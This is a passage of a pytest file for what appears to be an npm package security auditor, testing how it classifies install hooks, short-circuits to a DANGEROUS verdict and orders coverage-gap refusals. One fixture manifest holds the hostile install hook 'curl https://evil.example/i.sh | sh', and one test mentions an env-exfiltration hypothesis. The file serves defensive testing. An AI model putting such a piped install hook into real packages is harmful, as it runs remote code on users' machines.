        'sh "unbalanced',
        "sh $SCRIPT",
        "sh ${npm_package_config_target}",
        "node",
        "&&",
        "   ",
        "install.sh",
        "node_modules/.bin/patch-package",
    ],
)
async def test_a_degenerate_hook_value_is_a_gap_and_never_a_crash(tmp_path, command: str) -> None:
    """C27: the values that have no target to resolve at all — unbalanced quoting,
    a path the shell computes at run time, an interpreter with no operand, an
    operator on its own, whitespace, a bare name (a PATH lookup: npm puts
    node_modules/.bin on PATH and the package root NOT on it, so `install.sh` alone
    is not this package's file), and a path into a SKIP_DIRS directory, whose bytes
    classify_files never inventoried — so "absent from files" would not mean absent
    from the tarball, and calling it missing would be a false dealbreaker on
    `patch-package`. None of them may raise, and none may pass as clean: whitespace
    declares no command so there is nothing to run, and every other one is a gap.
    This is the class that keeps the INVARIANT total — a value this module cannot
    understand degrades to "we could not look", the only safe direction."""
    package = _write(
        tmp_path,
        {"package.json": _manifest(scripts={"install": command}), "index.js": SETUP_SOURCE},
    )
    inventory = await analyze_inventory(package)
    assert inventory.dealbreaker is None
    assert inventory.entryPoints.install == []
    checks = {flag.check for flag in inventory.flags}
    assert ("install-coverage-gap" in checks) is bool(command.strip())


# --------------------------------------------------------------------------- #
# The scripts block — boundaries
# --------------------------------------------------------------------------- #


async def test_empty_scripts_block_trips_nothing(tmp_path) -> None:
    """C12: `"scripts": {}` — present but empty. No hook, so no lifecycle flag."""
    package = _write(
        tmp_path, {"package.json": _manifest(scripts={}), "index.js": SETUP_SOURCE}
    )
    inventory = await analyze_inventory(package)
    assert inventory.scripts == {}
    assert inventory.dealbreaker is None
    assert inventory.flags == []


async def test_absent_scripts_block_trips_nothing(tmp_path) -> None:
    """C13: no `scripts` key at all — the common case for a library — behaves as
    the empty block, with nothing to install-check."""
    package = _write(tmp_path, {"package.json": _manifest(), "index.js": SETUP_SOURCE})
    inventory = await analyze_inventory(package)
    assert inventory.scripts == {}
    assert inventory.entryPoints.install == []
    assert inventory.dealbreaker is None
    assert inventory.flags == []


async def test_non_string_script_values_are_dropped(tmp_path) -> None:
    """C14: npm requires string script values; a manifest with a list, a null and
    a number keeps neither for the checks and raises nothing."""
    package = _write(
        tmp_path,
        {
            "package.json": _manifest(
                scripts={"install": ["node", "setup.js"], "prepare": None, "postinstall": 7}
            ),
            "index.js": SETUP_SOURCE,
        },
    )
    inventory = await analyze_inventory(package)
    assert inventory.scripts == {}
    assert inventory.dealbreaker is None
    assert inventory.flags == []


# --------------------------------------------------------------------------- #
# Manifest health × the checks
# --------------------------------------------------------------------------- #


async def test_unparseable_manifest_declaring_a_pipe_ends_the_audit(audit) -> None:
    """C15: the interaction that used to be a silent gap. This manifest's TEXT
    declares a piped install hook, but it does not parse. Before the loud parse
    failure, the
    failure became `{}`, so empty scripts + an empty install list made BOTH
    dealbreaker checks pass trivially and the audit ran on with no manifest
    knowledge — a swallow that could only bias toward SAFE. Now it is a located,
    retryable 0031 and NO report exists to be read as clean."""
    truncated = '{"name": "x", "scripts": {"install": "curl https://evil.example/i.sh | sh"'
    with pytest.raises(AuditIncompleteError) as excinfo:
        await audit({"package.json": truncated, "index.js": SETUP_SOURCE})
    assert excinfo.value.stage == "inventory"
    assert excinfo.value.code == "NPMGUARD-0031"
    assert excinfo.value.retryable is True
    assert "not valid JSON" in str(excinfo.value)
    assert "verdict_reached" not in _frame_types(audit.frames)


# --------------------------------------------------------------------------- #
# The short-circuit — what ships
# --------------------------------------------------------------------------- #

DEALBREAKER_PACKAGES = {
    "shell-pipe": _hook_package(PIPED_SCRIPTS["curl-into-sh"]),
    "missing-install-script": {
        "package.json": _manifest(scripts={"preinstall": BENIGN_HOOK}),
        "index.js": SETUP_SOURCE,
    },
}


@pytest.mark.parametrize("check", sorted(DEALBREAKER_PACKAGES))
async def test_dealbreaker_report_is_coherent_with_zero_hypotheses(audit, check: str) -> None:
    """C16: both checks reach the same hardcoded-DANGEROUS short-circuit, and what
    ships is asserted as a whole report — zero hypotheses is the contract on this
    path (§9), so a consumer branching on `verdict` gets a coherent object:
    dealbreaker set, counts all zero, no fileSummaries, and a trace of exactly the
    two phases that ran."""
    result = await audit(DEALBREAKER_PACKAGES[check])
    report = result.report
    assert report.verdict == "DANGEROUS"
    assert report.schemaVersion == 2
    assert report.dealbreaker is not None
    assert report.dealbreaker.check == check
    assert report.rationale == (
        f"Dealbreaker: {report.dealbreaker.check} — {report.dealbreaker.detail}"
    )
    assert report.counts.model_dump() == {
        "total": 0,
        "open": 0,
        "inProgress": 0,
        "confirmed": 0,
        "refuted": 0,
        "deferred": 0,
    }
    assert report.hypotheses == []
    assert report.confirmedHypIds == []
    assert report.fileSummaries == []
    assert [phase.phase for phase in report.trace] == ["resolve", "inventory"]


async def test_dealbreaker_emits_no_frame_from_a_later_phase(audit) -> None:
    """C17: what a live viewer receives. The inventory frames arrive, nothing from
    intent/flag/hypothesize/orchestrator does, and run() emits no terminal frame —
    the service owns that transition. The provider has no script for any role, so
    a later phase would have failed loudly rather than emitting anything."""
    result = await audit(DEALBREAKER_PACKAGES["shell-pipe"])
    types = _frame_types(result.frames)
    assert types == [
        "audit_started",
        "phase_started",
        "phase_completed",
        "dependencies_provisioned",
        "phase_started",
        "phase_completed",
        "file_list",
        "inventory_meta",
    ]
    phases = [frame["phase"] for frame in result.frames if frame["type"].startswith("phase_")]
    assert phases == ["resolve", "resolve", "inventory", "inventory"]
    later = {
        "intent_extracted",
        "file_analyzing",
        "file_verdict",
        "triage_complete",
        "graph_built",
        "hypothesis_emitted",
        "verdict_reached",
        "audit_error",
    }
    assert not later & set(types)


async def test_dealbreaker_report_is_persistable_under_its_real_version(
    audit, tmp_path, monkeypatch
) -> None:
    """C18: §9's last paragraph, proven. The report is built by hand, bypassing
    _report(), yet its two-entry trace still carries the inventory PhaseLog whose
    output embeds `metadata` — so the store recovers the concrete version and
    files the report under it, never a latest.json alias. DATA_DIR is an
    import-time constant, so it is re-pointed on the module here."""
    result = await audit(DEALBREAKER_PACKAGES["shell-pipe"])
    monkeypatch.setattr(report_store, "DATA_DIR", tmp_path / "reports")
    assert report_store.extract_report_version(result.report) == PACKAGE_VERSION
    assert report_store.save_report(PACKAGE_NAME, "latest", result.report) == PACKAGE_VERSION
    persisted = tmp_path / "reports" / PACKAGE_NAME / f"{PACKAGE_VERSION}.json"
    assert json.loads(persisted.read_text(encoding="utf-8"))["verdict"] == "DANGEROUS"


async def test_package_without_a_dealbreaker_proceeds_to_the_normal_pipeline(audit) -> None:
    """C19: the contrast that proves the short-circuit is a branch and not the path —
    intent and flag run, and the verdict comes from the graph."""
    provider = ScriptedLlm(
        {
            "intent": [
                json.dumps(
                    {
                        "statedPurpose": "a fixture package",
                        "expectedCapabilities": [],
                        "rationale": "from the manifest",
                    }
                )
            ],
            "flag": [json.dumps({"summary": "nothing of note", "capabilities": [], "flags": []})],
        }
    )
    result = await audit(_hook_package(BENIGN_HOOK), provider=provider)
    assert result.report.dealbreaker is None
    assert result.report.verdict == "SAFE"
    assert [phase.phase for phase in result.report.trace] == [
        "resolve",
        "inventory",
        "intent-extraction",
        "flag",
    ]
    assert "intent_extracted" in _frame_types(result.frames)


# --------------------------------------------------------------------------- #
# The coverage-gap refusal — NPMGUARD_REFUSE_INSTALL_COVERAGE_GAP
# --------------------------------------------------------------------------- #

# A published install hook whose executed code is nowhere in the tarball
# (keytar@7.9.0), so `analyze_inventory` leaves a `critical` gap and NO dealbreaker.
GAP_PACKAGE = {
    "package.json": _manifest(scripts={"install": PUBLISHED_HOOKS["prebuilt-binary"]}),
    "index.js": SETUP_SOURCE,
}


def _clean_flag_provider() -> ScriptedLlm:
    """intent + a zero-flag FLAG answer: the shortest route to a report, and the one
    that reaches `_report` through the `not flagged.flags` return."""
    return ScriptedLlm(
        {
            "intent": [
                json.dumps(
                    {
                        "statedPurpose": "a fixture package",
                        "expectedCapabilities": [],
                        "rationale": "from the manifest",
                    }
                )
            ],
            "flag": [json.dumps({"summary": "nothing of note", "capabilities": [], "flags": []})],
        }
    )


async def test_an_unresolvable_install_hook_cannot_reach_safe(audit, monkeypatch) -> None:
    """C29: with the knob on, a package whose install hook runs code this engine could
    not locate gets NO verdict — {SAFE, DANGEROUS} has no arm for "we could not
    check", so it is refused exactly as a DEFERRED hypothesis is. The FLAG answer is
    scripted clean, so nothing but the gap can end this audit."""
    monkeypatch.setenv("NPMGUARD_REFUSE_INSTALL_COVERAGE_GAP", "true")
    with pytest.raises(AuditIncompleteError) as excinfo:
        await audit(GAP_PACKAGE, provider=_clean_flag_provider())
    assert excinfo.value.stage == "inventory"
    assert excinfo.value.code == "NPMGUARD-0031"
    assert excinfo.value.retryable is True
    assert PUBLISHED_HOOKS["prebuilt-binary"] in str(excinfo.value)
    assert "verdict_reached" not in _frame_types(audit.frames)


async def test_the_same_gap_ships_safe_while_the_knob_is_off(audit) -> None:
    """C29b: the knob is NOT set here — the default IS the subject. Without this
    pairing C29 would also pass on an incidental crash, and the default would be
    unpinned."""
    result = await audit(GAP_PACKAGE, provider=_clean_flag_provider())
    assert result.report.verdict == "SAFE"
    assert result.report.dealbreaker is None
    inventory_phase = next(
        phase for phase in result.report.trace if phase.phase == "inventory"
    )
    assert any(
        INSTALL_COVERAGE_GAP in flag for flag in inventory_phase.output["flags"]
    ), inventory_phase.output["flags"]


async def test_a_dealbreaker_still_wins_over_a_coverage_gap(audit, monkeypatch) -> None:
    """C30: the first load-bearing ordering. This manifest trips BOTH — a
    `missing-install-script` dealbreaker on its `preinstall` and an unresolvable
    `install` — and the dealbreaker's early return happens first, so the audit ships
    a free, correct DANGEROUS verdict instead of refusing on the gap. Structural
    rather than positional: the dealbreaker path builds its report inline and never
    calls the function that owns the refusal. Reversing the two would trade a
    correct verdict for an error on a package we had already judged."""
    monkeypatch.setenv("NPMGUARD_REFUSE_INSTALL_COVERAGE_GAP", "true")
    result = await audit(
        {
            "package.json": _manifest(
                scripts={
                    "preinstall": BENIGN_HOOK,  # setup.js is NOT shipped below
                    "install": PUBLISHED_HOOKS["native-rebuild"],
                }
            ),
            "index.js": SETUP_SOURCE,
        }
    )
    assert result.report.verdict == "DANGEROUS"
    assert result.report.dealbreaker is not None
    assert result.report.dealbreaker.check == "missing-install-script"
    # The provider has no script for any role, so no phase after inventory ran: the
    # DANGEROUS verdict cost zero model calls, which is what "free" means here.
    assert [phase.phase for phase in result.report.trace] == ["resolve", "inventory"]


async def test_a_confirmed_hypothesis_still_wins_over_a_coverage_gap(
    audit, monkeypatch
) -> None:
    """C31: the second load-bearing ordering, and the one that decides whether this
    refusal can ever cost a true positive. The same unresolvable install hook, but
    the orchestrator confirms a hypothesis with cited evidence — and the report is
    DANGEROUS, not 0031. This is the same rule retrieval gaps follow,
    applied here: a gap is raised AFTER the run and never instead of it, so it can
    displace an absent verdict but never a proven one. Reversing it (refusing
    whenever a gap exists) would discard confirmed malware because a sibling
    `node-gyp rebuild` was unreadable — strictly worse than the SAFE this change
    exists to prevent.

    The graph is driven through the pipeline's own named module attributes
    (`run_hypothesize`, `run_orchestrator`) rather than through a real sandbox: the
    subject is the ORDERING of the gap check against CONFIRMED, and a docker run
    would add ~14 sandbox experiments to prove a branch."""
    monkeypatch.setenv("NPMGUARD_REFUSE_INSTALL_COVERAGE_GAP", "true")

    armed = Hypothesis(
        hypId="hyp-0001",
        description="setup.js posts process.env to a remote host",
        claim=Claim(kind="env_exfil", gating=None),
        focusFiles=["index.js"],
        focusLines=[FocusRange(file="index.js", range="1-1")],
        experiment=[
            ToolCall(
                tool="trigger",
                args={"kind": "entrypoint", "target": "index.js", "argv": [], "stdin": None},
            )
        ],
        severity="critical",
        parentHypId=None,
        childHypIds=[],
        state="OPEN",
        createdBy="hypothesize",
        evidenceRefs=[],
        createdAt="2026-07-25T00:00:00Z",
        resolvedAt=None,
        resolution=None,
    )

    async def _hypothesize(*args, **kwargs):
        return [armed]

    async def _orchestrate(graph, **kwargs):
        graph.transition(
            "hyp-0001",
            "CONFIRMED",
            by="judge",
            reason="the run exfiltrated the canary",
            evidence_refs=[EvidenceRef(kind="run", id="run-1", hash="deadbeef")],
        )
        return OrchestratorSummary(dispatched=1, confirmed=1)

    monkeypatch.setattr(pipeline_module, "run_hypothesize", _hypothesize)
    monkeypatch.setattr(pipeline_module, "run_orchestrator", _orchestrate)

    provider = ScriptedLlm(
        {
            "intent": [
                json.dumps(
                    {
                        "statedPurpose": "a fixture package",
                        "expectedCapabilities": [],
                        "rationale": "from the manifest",
                    }
                )
            ],
            "flag": [
                json.dumps(
                    {
                        "summary": "posts environment variables out",
                        "capabilities": ["ENV_VARS", "NETWORK"],
                        "flags": [{"lines": ["1-1"], "why": "reads process.env and POSTs it"}],
                    }
                )
            ],
        }
    )
    result = await audit(GAP_PACKAGE, provider=provider)
    assert result.report.verdict == "DANGEROUS"
    assert result.report.confirmedHypIds == ["hyp-0001"]
    assert result.report.counts.confirmed == 1
    # The gap is still REPORTED — it was skipped, not deemed absent.
    inventory_phase = next(
        phase for phase in result.report.trace if phase.phase == "inventory"
    )
    assert any(INSTALL_COVERAGE_GAP in flag for flag in inventory_phase.output["flags"])
